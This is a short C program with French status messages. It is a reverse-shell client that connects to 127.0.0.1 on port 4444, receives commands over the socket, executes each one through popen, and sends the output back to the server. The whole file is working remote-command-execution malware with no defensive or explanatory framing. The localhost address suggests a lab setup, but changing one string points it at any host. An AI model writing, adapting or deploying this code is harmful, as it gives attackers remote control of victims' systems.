#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1) {
        perror("socket");
        return 1;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_port = htons(4444);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == -1) {
        perror("connect");
        close(sock);
        return 1;
    }

    printf("[+] Connecté au serveur !\n");

    char cmd[1024] = {0};
    char line[1024] = {0};
    char output[65536] = {0};

    while (1) {
        memset(cmd, 0, sizeof(cmd));
        int n = recv(sock, cmd, sizeof(cmd) - 1, 0);
        if (n <= 0) {
            printf("[!] Serveur déconnecté.\n");
            break;
        }
        cmd[n] = '\0';

        if (strcmp(cmd, "exit") == 0)
            break;

        memset(output, 0, sizeof(output));
        FILE *fp = popen(cmd, "r");
        if (fp == NULL) {
            snprintf(output, sizeof(output), "[!] Impossible d'exécuter la commande.\n");
        } else {
            size_t total = 0;
            while (fgets(line, sizeof(line), fp) != NULL) {
                size_t len = strlen(line);
                if (total + len < sizeof(output) - 1) {
                    strcat(output, line);
                    total += len;
                }
            }
            pclose(fp);
        }

        if (send(sock, output, strlen(output), 0) == -1) {
            printf("[!] Erreur d'envoi.\n");
            break;
        }
    }

    close(sock);
    return 0;
}
